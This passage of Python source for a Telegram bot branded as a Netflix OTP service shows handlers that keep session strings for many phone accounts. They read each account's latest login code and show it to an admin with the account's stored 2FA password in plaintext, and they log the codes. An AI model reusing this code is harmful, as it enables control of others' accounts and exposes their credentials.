        markup.add(InlineKeyboardButton("❌ Cancel", callback_data=f"account_{account_id}"))
        
        send_or_edit_message(
            call.message.chat.id,
            user_id,
            login_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
    except Exception as e:
        logger.error(f"Re-login error: {e}")
        bot.answer_callback_query(call.id, "Error starting re-login", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "start_relogin")
def handle_start_relogin(call):
    """Start the re-login process"""
    user_id = call.from_user.id
    
    state = login_states.get(user_id)
    if not state or "existing_phone" not in state:
        bot.answer_callback_query(call.id, "Session expired", show_alert=True)
        return
    
    # Use existing phone number
    phone = state["existing_phone"]
    
    # Send OTP
    sending_text = """
<b>⏳ Sending OTP...</b>

<i>Please wait while we send verification code to the phone number.</i>
"""
    
    send_or_edit_message(
        call.message.chat.id,
        user_id,
        sending_text,
        photo_url=NETFLIX_MAIN_IMAGE
    )
    
    try:
        result = account_manager.send_otp(phone)
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            error_text = f"""
<b>❌ Failed to send OTP</b>

{error_msg}

Click below to try again:
"""
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Try Again", callback_data="start_relogin"))
            markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin"))
            
            send_or_edit_message(
                call.message.chat.id,
                user_id,
                error_text,
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            return
        
        # Update state for OTP input
        login_states[user_id] = {
            "step": "ask_otp",
            "phone": phone,
            "phone_code_hash": result["phone_code_hash"],
            "session_key": result["session_key"],
            "user_type": "admin",
            "relogin_account_id": state.get("relogin_account_id")
        }
        
        otp_text = f"""
<b>✅ OTP Sent Successfully</b>

Phone: <code>{phone}</code>

Enter the 5-digit OTP code received on Telegram:
"""
        
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
        )
        
        send_or_edit_message(
            call.message.chat.id,
            user_id,
            otp_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
    except Exception as e:
        logger.error(f"Send OTP error: {e}")
        
        error_text = f"""
<b>❌ Connection Error</b>

Failed to send verification code.

Error: {str(e)}

Start again with /start
"""
        
        send_or_edit_message(
            call.message.chat.id,
            user_id,
            error_text,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
        if user_id in login_states:
            del login_states[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("get_otp_"))
def handle_get_otp(call):
    """Fetch latest OTP for account (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    account_id = call.data.replace("get_otp_", "")
    
    try:
        # Get account
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            return
        
        session_string = account.get("session_string", "")
        if not session_string:
            bot.answer_callback_query(call.id, "No session available", show_alert=True)
            return
        
        bot.answer_callback_query(call.id, "⏳ Fetching OTP...")
        
        # Fetch OTP using Pyrogram
        otp = account_manager.get_latest_otp(
            session_string,
            account["phone"]
        )
        
        if not otp:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
            markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
            
            send_or_edit_message(
                call.message.chat.id,
                user_id,
                f"<b>📱 No OTP Found</b>\n\n"
                f"Phone: <code>{format_phone(account['phone'])}</code>\n\n"
                f"No OTP found in recent messages.",
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            return
        
        # Save OTP to logs
        save_otp_log(account["phone"], otp, user_id)
        
        # Prepare message
        message = f"<b>📱 OTP Details</b>\n\n"
        message += f"<b>Phone:</b> <code>{format_phone(account['phone'])}</code>\n"
        message += f"<b>OTP:</b> <code>{otp}</code>\n"
        
        if account.get("has_2fa") and account.get("two_step_password"):
            message += f"<b>2FA Password:</b> <code>{account['two_step_password']}</code>\n"
        
        message += f"<b>Fetched:</b> {datetime.utcnow().strftime('%H:%M:%S')}\n"
        
        # Create buttons
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
        markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
        
        send_or_edit_message(
            call.message.chat.id,
            user_id,
            message,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
    except Exception as e:
        logger.error(f"Get OTP error: {e}")
        bot.answer_callback_query(call.id, f"Session expired. Please re-login.", show_alert=True)
        
        # Mark account as invalid
        accounts_col.update_one(
            {"_id": ObjectId(account_id)},
            {"$set": {"status": "invalid"}}
        )

@bot.callback_query_handler(func=lambda call: call.data == "otp_logs")
def handle_otp_logs(call):
    """Show OTP logs from last 24 hours (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    # Cleanup old logs first
    cleanup_old_logs()
    
    # Get OTP logs from last 24 hours
    cutoff_time = datetime.utcnow() - timedelta(hours=24)
    logs = list(otp_logs_col.find(
        {"fetched_at": {"$gte": cutoff_time}},
        {"phone": 1, "otp": 1, "fetched_at": 1}
    ).sort("fetched_at", -1).limit(20))
    
    if not logs:
        logs_text = "<b>📊 OTP Logs (Last 24 Hours)</b>\n\nNo OTP logs found in the last 24 hours."
    else:
        logs_text = "<b>📊 OTP Logs (Last 24 Hours)</b>\n\n"
        for idx, log in enumerate(logs, 1):
            phone = format_phone(log.get("phone", "N/A"))
            otp = log.get("otp", "N/A")
            time = log.get("fetched_at", datetime.utcnow()).strftime("%H:%M")
            logs_text += f"{idx}. {phone}: <code>{otp}</code> ({time})\n"
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
    
    send_or_edit_message(
        call.message.chat.id,
        user_id,
        logs_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE
    )

@bot.callback_query_handler(func=lambda call: call.data == "back_to_welcome")
def handle_back_to_welcome(call):
    """Go back to welcome screen for users"""
    user_id = call.from_user.id
    
    # Clear any states
    if user_id in login_states:
        del login_states[user_id]
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    show_netflix_welcome(user_id, call.message.chat.id)

# ========================
# MESSAGE HANDLER
# ========================
@bot.message_handler(func=lambda m: True)
def handle_other_messages(message):
    """Handle all other messages"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Ensure user exists
    ensure_user_exists(user_id, message.from_user.first_name, message.from_user.username)
    
    # Clear states
    if user_id in login_states:
        del login_states[user_id]
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    # Show appropriate menu
    if is_admin(user_id):
        show_admin_dashboard(user_id, chat_id)
    else:
        show_netflix_welcome(user_id, chat_id)

# ========================
# RUN BOT
# ========================
if __name__ == "__main__":
    logger.info("🎬 Starting Netflix OTP Bot...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"📱 API ID: {API_ID}")
    logger.info(f"🖼️ Netflix Image: {NETFLIX_WELCOME_IMAGE}")
    
    # Create indexes
    try:
        accounts_col.create_index([("phone", 1)], unique=True)
        accounts_col.create_index([("created_at", -1)])
        accounts_col.create_index([("session_string", 1)])
        accounts_col.create_index([("status", 1)])
        otp_logs_col.create_index([("fetched_at", -1)], expireAfterSeconds=86400)  # Auto delete after 24h
        users_col.create_index([("user_id", 1)], unique=True)
        users_col.create_index([("created_at", -1)])
        logger.info("✅ Database indexes created")
    except Exception as e:
        logger.error(f"❌ Index creation error: {e}")
    
    # Start bot
    logger.info("✅ Bot is running...")
    bot.infinity_polling()
